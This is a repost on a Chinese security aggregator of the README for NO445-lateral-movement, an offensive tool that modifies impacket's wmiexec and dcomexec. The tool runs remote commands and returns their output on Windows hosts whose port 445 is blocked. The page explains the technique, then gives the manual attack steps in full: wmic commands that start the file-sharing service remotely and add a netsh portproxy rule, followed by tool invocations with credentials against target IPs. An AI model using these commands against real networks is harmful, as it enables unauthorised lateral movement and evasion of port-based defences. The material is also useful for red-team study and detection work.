---
title: timwhitez starred NO445-lateral-movement
url: https://buaq.net/go-143975.html
source: unSafe.sh - 不安全
date: 2023-01-04
fetch_date: 2025-10-04T02:58:47.910944
---

# timwhitez starred NO445-lateral-movement

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/c31cfd60e0ae600306dfaf65ac239c55.jpg)

timwhitez starred NO445-lateral-movement

impacket的wmiexec在没有打开445端口的情况下，进行有回显的命令执行工具。安装方法在安装好impacket的情况下，直接使用wmiexec-no445.p
*2023-1-3 18:56:23
Author: [github.com(查看原文)](/jump-143975.htm)
阅读量:26
收藏*

---

impacket的wmiexec在没有打开445端口的情况下，进行有回显的命令执行工具。

## 安装方法

在安装好impacket的情况下，直接使用wmiexec-no445.py替换wmiexec.py就行。dcomexec.py一样。

## 原理介绍

此方法是通过wmi的silentcommand模式来直接通过135和高端口进行命令执行，后通过目标机器的netsh将高端口的流量转发到445，从而达到绕过445端口进行有回显的命令执行。因此此方法相比于wmi的silentcommand模式命令执行没有增加任何限制条件，只要能进行命令执行就能有回显。并且因为是通过smb来进行回显，因此也没有回显的长度限制。dcomexec在流量层和wmiexec一样，但是它的主机行为和wmi不一样，它直接使用的DCOM，没有wmi的具体行为。

## Windows手动回显命令执行

### 一、先打开文件共享服务

> wmic /node:172.16.178.9 /user:windows8 /password:\* service where name="LanmanServer" call startservice

### 二、进行端口转发(将445端口转发到44500端口)

> wmic /node:172.16.178.9 /user:windows8 /password:\* process call create "cmd.exe /c netsh interface portproxy add v4tov4 listenport=44500 listenaddress=0.0.0.0 connectport=445 connectaddress=127.0.0.1"

### 三、通过原始的impacket进行命令执行

在执行之前需要修改nmb.py中的SMB\_SESSION\_PORT值为更改的端口

> python3 wmiexec.py windows.local/windows8:\*@172.16.178.9 "whoami"

## 工具使用方法

* 工具使用的前提是目标机器设置的端口黑名单，有打开135端口和10000以上的高端口，就能通过此工具进行横行移动了。

在目标没有打开445的情况下执行回显命令（默认445的转发端口为44500）：

> python3 wmiexec-no445.py windows.local/windows8:\*@172.16.178.9 "ipconfig" -no445

> python3 dcomexec-no445.py ./administrator:\*@172.16.178.5 "whoami" -object MMC20 -no445

在指定50000为445的转发端口下执行回显命令：

> python3 wmiexec-no445.py windows.local/windows8:\*@172.16.178.9 "ipconfig" -no445 -proxyport 50000

清除目标机器中的端口转发设置（默认清除44500）

> python3 wmiexec-no445.py windows.local/windows8:\*@172.16.178.9 -clearport

> python3 dcomexec-no445.py ./administrator:\*@172.16.178.5 "whoami" -object MMC20 -clearport

清除目标机器中的特定转发端口

> python3 wmiexec-no445.py windows.local/windows8:\*@172.16.178.9 -portclear -proxyport 50000

## 使用实例

[![image-20220209111347219](https://github.com/JDArmy/NO445-lateral-movement/raw/main/example.png)](https://github.com/JDArmy/NO445-lateral-movement/blob/main/example.png)

文章来源: https://github.com/JDArmy/NO445-lateral-movement
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)